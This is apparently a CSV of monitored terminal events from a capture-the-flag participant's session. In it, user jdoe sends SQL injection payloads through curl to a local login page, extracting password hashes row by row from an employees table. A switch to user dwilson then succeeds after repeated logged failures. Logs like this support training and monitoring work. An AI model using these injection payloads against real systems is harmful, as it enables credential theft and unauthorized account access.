log_event_id,session_id,participant_id,source_file,line_number,timestamp_sec,event_class,raw_text,command,path,exit_code,extra_json
L06687,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6687,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06688,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6688,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06689,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6689,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06690,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6690,,2026-04-03 05:54:24,"[COMMAND] jdoe@Shreyas:/home/jdoe - [USER] PID:4360 UID:1010 CMD: curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 1--&password=x"" http://localhost:8000/login",,,,{}
L06691,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6691,,2026-04-03 05:54:24,"[NETWORK_ACTIVITY] jdoe@Shreyas:/home/jdoe - curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 1--&password=x"" http://localhost:8000/login",,,,{}
L06692,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6692,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06693,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6693,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06694,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6694,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06695,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6695,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06696,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6696,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06697,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6697,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06698,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6698,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06699,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6699,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06700,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6700,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06701,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6701,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06702,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6702,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06703,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6703,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06704,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6704,,2026-04-03 05:54:31,"[COMMAND] jdoe@Shreyas:/home/jdoe - [USER] PID:4360 UID:1010 CMD: curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 2--&password=x"" http://localhost:8000/login",,,,{}
L06705,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6705,,2026-04-03 05:54:31,"[NETWORK_ACTIVITY] jdoe@Shreyas:/home/jdoe - curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 2--&password=x"" http://localhost:8000/login",,,,{}
L06706,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6706,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06707,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6707,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06708,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6708,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06709,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6709,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06710,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6710,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06711,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6711,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06712,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6712,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06713,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6713,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06714,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6714,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06715,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6715,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06716,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6716,,2026-04-03 05:54:37,"[COMMAND] jdoe@Shreyas:/home/jdoe - [USER] PID:4360 UID:1010 CMD: curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 3--&password=x"" http://localhost:8000/login",,,,{}
L06717,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6717,,2026-04-03 05:54:37,"[NETWORK_ACTIVITY] jdoe@Shreyas:/home/jdoe - curl -d ""username=' UNION SELECT username || '|' || password_hash FROM employees LIMIT 1 OFFSET 3--&password=x"" http://localhost:8000/login",,,,{}
L06718,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6718,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06719,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6719,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06720,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6720,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06721,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6721,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06722,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6722,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06723,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6723,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06724,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6724,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06725,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6725,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06726,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6726,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06727,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6727,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06728,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6728,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06729,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6729,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06730,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6730,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06731,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6731,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06732,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6732,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06733,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6733,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06734,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6734,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06735,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6735,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06736,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6736,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06737,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6737,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06738,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6738,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06739,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6739,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06740,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6740,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06741,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6741,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06742,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6742,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06743,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6743,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06744,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6744,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06745,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6745,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06746,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6746,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06747,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6747,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06748,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6748,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06749,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6749,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06750,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6750,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06751,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6751,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06752,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6752,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06753,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6753,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06754,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6754,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06755,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6755,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06756,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6756,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06757,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6757,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06758,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6758,,2026-04-03 05:54:58,[COMMAND] jdoe@Shreyas:/home/jdoe - [USER] PID:4360 UID:1010 CMD: clear,,,,{}
L06759,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6759,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06760,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6760,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06761,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6761,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06762,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6762,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06763,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6763,,2026-04-03 05:55:00,[COMMAND] jdoe@Shreyas:/home/jdoe - [USER] PID:4360 UID:1010 CMD: su dwilson,,,,{}
L06764,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6764,,2026-04-03 05:55:00,[USER_SWITCH_ATTEMPT] jdoe@Shreyas:/home/jdoe - su dwilson,,,,{}
L06765,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6765,,2026-04-03 05:55:00,[USER_SWITCH_START] jdoe@Shreyas:/home/jdoe - Switching from jdoe to dwilson,,,,{}
L06766,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6766,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06767,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6767,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06768,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6768,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06769,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6769,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06770,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6770,,auth_monitor,Apr  3 05:52:30 Shreyas su: pam_unix(su:auth): authentication failure; logname= uid=1010 euid=0 tty=pts/0 ruser=jdoe rhost=  user=dwilson,,,,{}
L06771,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6771,,auth_monitor,Apr  3 05:52:32 Shreyas su: FAILED SU (to dwilson) jdoe on pts/0,,,,{}
L06772,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6772,,2026-04-03 05:55:04,[SESSION_START] dwilson@Shreyas:/home/jdoe - Shell started - PID:19092 PPID:18937 TTY:/dev/pts/0,,,,{}
L06773,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6773,,2026-04-03 05:55:04,[COMMAND] dwilson@Shreyas:/home/jdoe - [USER] PID:19092 UID:1003 CMD: export -f log_external su,,,,{}
L06774,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6774,,auth_monitor,Apr  3 05:55:04 Shreyas su: (to dwilson) jdoe on pts/0,,,,{}
L06775,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6775,,auth_monitor,Apr  3 05:55:04 Shreyas su: pam_env(su:session): Unable to open env file: /etc/default/locale: No such file or directory,,,,{}
L06776,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6776,,auth_monitor,Apr  3 05:55:04 Shreyas su: pam_unix(su:session): session opened for user dwilson(uid=1003) by (uid=1010),,,,{}
L06777,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6777,,2026-04-03 05:55:04,"[COMMAND] dwilson@Shreyas:/home/jdoe - [USER] PID:19092 UID:1003 CMD: export BASH_ENV=""/etc/profile.d/optimized-logging.sh""",,,,{}
L06778,S_p44@ctfp.app,p44@ctfp.app,assets/logs/participant44-b3324ecc-1eeb-4d3c-866d-eaaebed363b1/activity.log,6778,,2026-04-03 05:55:04,"[COMMAND] dwilson@Shreyas:/home/jdoe - [USER] PID:19092 UID:1003 CMD: trap 'log_external ""local0"" ""SESSION_END"" ""Shell exit - PID:$$ Duration:$SECONDS seconds""; rm -f ""$HIST_TEMP_FILE"" 2>/dev/null' EXIT",,,,{}
